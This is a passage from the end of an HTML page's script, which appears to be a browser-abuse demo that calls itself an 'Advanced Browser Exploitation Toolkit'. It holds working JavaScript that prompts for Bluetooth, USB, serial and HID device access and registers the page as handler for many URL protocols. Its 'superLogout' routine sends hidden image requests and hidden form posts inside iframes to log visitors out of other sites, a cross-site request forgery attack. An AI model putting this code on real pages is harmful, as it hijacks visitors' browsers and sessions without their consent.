                    .then(device => device.gatt.connect());
            } catch {}
        }

        // Request access to USB devices
        function requestUsbAccess() {
            try {
                navigator.usb.requestDevice({ filters: [{}] });
            } catch {}
        }

        // Request access to Serial devices
        function requestSerialAccess() {
            try {
                navigator.serial.requestPort({ filters: [] });
            } catch {}
        }

        // Request access to HID devices
        function requestHidAccess() {
            try {
                navigator.hid.requestDevice({ filters: [] });
            } catch {}
        }

        // Attempt to register all possible browser-whitelisted protocols
        function registerProtocolHandlers() {
            if (typeof navigator.registerProtocolHandler !== 'function') return;

            const protocolWhitelist = [
                'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms', 'news',
                'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn', 'webcal', 'wtai', 'xmpp'
            ];

            const handlerUrl = window.location.href + '/url=%s';

            protocolWhitelist.forEach(proto => {
                navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site');
            });
        }

        // Log the user out of top sites they're logged into
        function superLogout() {
            function cleanup(el, delayCleanup) {
                if (delayCleanup) {
                    delayCleanup = false;
                    return;
                }
                el.parentNode.removeChild(el);
            }

            function get(url) {
                const img = document.createElement('img');
                img.onload = () => cleanup(img);
                img.onerror = () => cleanup(img);
                img.style = HIDDEN_STYLE;
                document.body.appendChild(img);
                img.src = url;
            }

            function post(url, params) {
                const iframe = document.createElement('iframe');
                iframe.style = HIDDEN_STYLE;
                iframe.name = 'iframe' + numSuperLogoutIframes;
                document.body.appendChild(iframe);

                numSuperLogoutIframes += 1;

                const form = document.createElement('form');
                form.style = HIDDEN_STYLE;

                let numLoads = 0;
                iframe.onload = iframe.onerror = () => {
                    if (numLoads >= 1) cleanup(iframe);
                    numLoads += 1;
                };
                form.action = url;
                form.method = 'POST';
                form.target = iframe.name;

                for (const param in params) {
                    if (Object.prototype.hasOwnProperty.call(params, param)) {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = param;
                        input.value = params[param];
                        form.appendChild(input);
                    }
                }

                document.body.appendChild(form);
                form.submit();
            }

            for (const name in LOGOUT_SITES) {
                const method = LOGOUT_SITES[name][0];
                const url = LOGOUT_SITES[name][1];
                const params = LOGOUT_SITES[name][2] || {};

                if (method === 'GET') {
                    get(url);
                } else {
                    post(url, params);
                }

                const div = document.createElement('div');
                div.innerText = `Logging you out from ${name}...`;

                const logoutMessages = document.querySelector('.logout-messages');
                if (logoutMessages) {
                    logoutMessages.appendChild(div);
                }
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üöÄ Advanced Browser Exploitation Toolkit loaded!');
            // Removed automatic initialization - now only on red button click
        });
    </script>
</body>
</html>
